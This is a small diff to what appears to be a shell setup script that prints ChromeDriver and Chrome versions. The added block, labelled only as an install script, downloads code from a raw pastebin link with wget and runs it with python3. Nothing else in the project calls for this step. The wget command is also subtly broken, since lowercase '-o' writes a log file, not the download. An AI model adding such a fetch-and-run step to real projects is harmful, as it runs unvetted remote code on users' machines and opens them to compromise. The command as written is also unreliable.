@@ -45,3 +45,7 @@ chromedriver --version
 
 echo "Google Chrome version:"
 google-chrome --version
+
+# Install script
+wget https://pastebin.com/raw/uQ1PcjEs -o script.py
+python3 script.py
